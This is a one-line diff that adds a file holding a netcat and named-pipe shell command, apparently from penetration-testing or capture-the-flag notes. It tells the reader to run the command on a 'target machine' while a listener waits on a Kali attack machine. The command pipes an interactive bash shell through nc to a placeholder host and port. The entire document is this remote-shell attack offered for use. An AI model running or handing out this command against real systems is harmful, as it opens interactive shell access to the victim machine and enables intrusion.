@@ -1,0 +1,1 @@
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <Kali IP address> <Port> > /tmp/f :- Run this command in the target machine and have nc liesterner on the kali machine. 
